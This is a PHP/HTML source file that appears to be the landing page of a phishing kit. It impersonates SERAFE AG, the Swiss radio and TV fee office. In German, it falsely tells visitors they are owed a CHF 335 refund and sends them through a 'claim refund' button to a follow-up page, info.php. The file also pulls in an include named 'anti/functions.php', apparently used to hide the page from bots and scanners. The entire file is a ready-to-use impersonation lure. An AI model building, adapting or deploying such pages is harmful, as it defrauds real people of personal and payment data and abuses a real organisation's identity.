<?php 
    require_once "../anti/functions.php";
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Serafe Remboursement</title>
    <!-- <link rel="stylesheet" href=".\res\app.css"> -->
     <style>
      body {
    margin: 0;
    font-family: Arial, sans-serif;
    color: #333;
}

/* Barre du haut */
.topbar {
    background: #0f5c5c;
    color: white;
    padding: 10px 20px;
}

.nav {
    display: flex;
    justify-content: flex-end;
    gap: 20px;
    font-size: 14px;
}

/* Bandeau logo */
.hero {
    background: #197373;
    padding: 30px 20px;
}

.logo {
    color: white;
    font-size: 40px;
    font-weight: 300;
    margin: 0;
}

/* Contenu principal */
.container {
    padding: 40px 20px;
    max-width: 800px;
    margin: 0 auto;
    text-align: center;
}

.container h2 {
    font-size: 32px;
    font-weight: 400;
}

.container p {
    font-size: 18px;
    line-height: 1.6;
}

/* Bouton */
.btn {
    margin-top: 30px;
    padding: 15px 30px;
    background: #197373;
    color: white;
    border: none;
    border-radius: 30px;
    font-size: 16px;
    cursor: pointer;
}

.btn:hover {
    background: #145c5c;
}

/* Footer */
.footer {
    padding: 40px 20px;
    max-width: 900px;
    font-size: 14px;
    color: #555;
    margin: auto;
    BACKGROUND: #f0f0f0;  
    display: flex;
    justify-content:SPACE-BETWEEN;
}

.footer h3 {
    margin-top: 0;
}

.footer .links {
    margin-top: 20px;
    line-height: 1.8;
}

/* ============ MEDIA QUERIES - RESPONSIVE DESIGN ============ */

/* LARGE SCREENS - PC (1440px et plus) */
@media (min-width: 1440px) {
    .container {
        padding: 50px 30px;
        max-width: 1000px;
    }
    
    .container h2 {
        font-size: 36px;
        margin-bottom: 25px;
    }
    
    .container p {
        font-size: 18px;
        margin-bottom: 15px;
    }
}

/* MEDIUM SCREENS - Tablettes (768px à 1023px) */
@media (min-width: 768px) and (max-width: 1023px) {
    .container {
        padding: 30px 20px;
        max-width: 100%;
    }
    
    .container h2 {
        font-size: 28px;
        margin-bottom: 20px;
    }
    
    .container p {
        font-size: 16px;
        margin-bottom: 12px;
    }
    
    .logo {
        font-size: 34px;
    }
    
    .nav {
        gap: 15px;
        font-size: 13px;
    }
    
    .footer {
        padding: 30px 20px;
        flex-direction: row;
        gap: 30px;
    }
    
    .btn {
        padding: 13px 28px;
        font-size: 15px;
    }
}

/* SMALL SCREENS - Téléphones (481px à 767px) */
@media (min-width: 481px) and (max-width: 767px) {
    body {
        font-size: 14px;
    }
    
    .topbar {
        padding: 10px 15px;
    }
    
    .nav {
        gap: 12px;
        font-size: 12px;
        justify-content: space-around;
    }
    
    .hero {
        padding: 25px 15px;
    }
    
    .logo {
        font-size: 30px;
    }
    
    .container {
        padding: 25px 15px;
        max-width: 100%;
    }
    
    .container h2 {
        font-size: 22px;
        margin: 15px 0;
    }
    
    .container p {
        font-size: 14px;
        line-height: 1.5;
        margin: 10px 0;
    }
    
    .btn {
        margin-top: 20px;
        padding: 12px 24px;
        font-size: 14px;
        width: auto;
        max-width: 280px;
    }
    
    .footer {
        padding: 25px 15px;
        flex-direction: column;
        gap: 20px;
        font-size: 13px;
    }
    
    .footer h3,
    .footer h4 {
        margin: 10px 0 8px 0;
        font-size: 14px;
    }
}

/* EXTRA SMALL SCREENS - Petits téléphones (max-width: 480px) */
@media (max-width: 480px) {
    body {
        font-size: 13px;
    }
    
    .topbar {
        padding: 8px 10px;
    }
    
    .nav {
        flex-wrap: wrap;
        justify-content: center;
        gap: 8px;
        font-size: 10px;
    }
    
    .hero {
        padding: 15px 10px;
    }
    
    .logo {
        font-size: 24px;
        margin: 0;
    }
    
    .container {
        padding: 15px 10px;
        max-width: 100%;
        margin: 0 auto;
    }
    
    .container h2 {
        font-size: 18px;
        margin: 10px 0;
        font-weight: 400;
    }
    
    .container p {
        font-size: 13px;
        line-height: 1.4;
        margin: 8px 0;
    }
    
    .btn {
        margin-top: 15px;
        padding: 10px 18px;
        font-size: 13px;
        width: 100%;
        max-width: 240px;
        box-sizing: border-box;
    }
    
    .footer {
        padding: 15px 10px;
        flex-direction: column;
        gap: 12px;
        font-size: 11px;
        margin: 0;
    }
    
    .footer h3,
    .footer h4 {
        margin: 8px 0 4px 0;
        font-size: 12px;
        font-weight: 600;
    }
    
    .footer p {
        margin: 4px 0;
        font-size: 11px;
        line-height: 1.4;
    }
    
    .footer .links {
        margin-top: 8px;
        line-height: 1.5;
    }
}

/* ULTRA SMALL SCREENS - Très petits écrans (max-width: 360px) */
@media (max-width: 360px) {
    .logo {
        font-size: 20px;
    }
    
    .container h2 {
        font-size: 16px;
        margin: 8px 0;
    }
    
    .container p {
        font-size: 12px;
        margin: 6px 0;
    }
    
    .btn {
        padding: 9px 15px;
        font-size: 12px;
        margin-top: 12px;
    }
    
    .nav {
        font-size: 9px;
    }
}
     </style>
</head>
    <body>

    <header class="topbar">
        <div class="nav">
            <span>Wir über uns</span>
            <span>Jobs</span>
            <span>Kontakt</span>
            <span>Deutsch</span>
        </div>
    </header>

    <section class="hero">
        <h1 class="logo">serafe</h1>
    </section>

    <main class="container">
        <h2>Fordern Sie Ihre CHF 335 Rückerstattung an</h2>

        <p>
        Sie haben eine <strong>nicht beanspruchte Rückerstattung von CHF 335 </strong>aus Ihren Serafe-Gebühren.
        </p>

        <p>
            Dies ist der Fall, weil Sie Ihre jährliche Serafe-Gebühr zu viel bezahlt haben oder Ihr Konto aufgrund von Änderungen in der Haushaltsregistrierung angepasst wurde.
        </p>

        <button class="btn"  onclick="window.location='info.php';">Rückerstattung beantragen</button>
    </main>
    <footer class="footer">
    <div>
    <h3>Kontaktadresse</h3>
        <p>
            SERAFE AG<br>
            Schweizerische Erhebungsstelle<br>
            für die Radio- und Fernsehabgabe<br>
            Postfach<br>
            8010 Zürich
        </p>
    </div>
    <div>
        <h4>Downloads</h4>
        <p>Alle Downloads</p>
    </div>
    <div>
        <p class="links">
            © SERAFE AG<br>
            Datenschutz<br>
            Impressum<br>
            Disclaimer<br>
            Rechtliches<br>
            Medienbereich<br>
            Archiv
        </p>
    </div>
    </footer>
    </body>
</html>



